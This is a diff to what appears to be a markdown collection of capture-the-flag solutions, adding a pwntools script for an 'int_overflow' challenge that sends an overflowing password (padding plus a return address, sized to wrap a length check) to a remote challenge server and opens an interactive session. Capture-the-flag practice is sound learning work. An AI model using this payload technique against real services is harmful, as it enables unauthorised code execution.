@@ -158,8 +158,24 @@ p.interactive()
 ```
 
 # int_overflow
+```python
+from pwn import *
+p=remote('111.198.29.45',47132)
+
+addr=0x804868b
+pay='a'*(0x14+4)+p32(addr)+'a'*(262-0x14-4-4)
+
+p.recvuntil('choice:')
+p.sendline('1')
+
+p.recvuntil('username:')
+p.sendline('ffdy')
+
+p.recvuntil('passwd:')
+p.sendline(pay)
+p.interactive()
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTQwNDIxNTkwMCwxNDMxNzU2Mzk0LDYwNT
+eyJoaXN0b3J5IjpbMTg2MDkzMjUxMiwxNDMxNzU2Mzk0LDYwNT
 Q2NzExXX0=
 -->
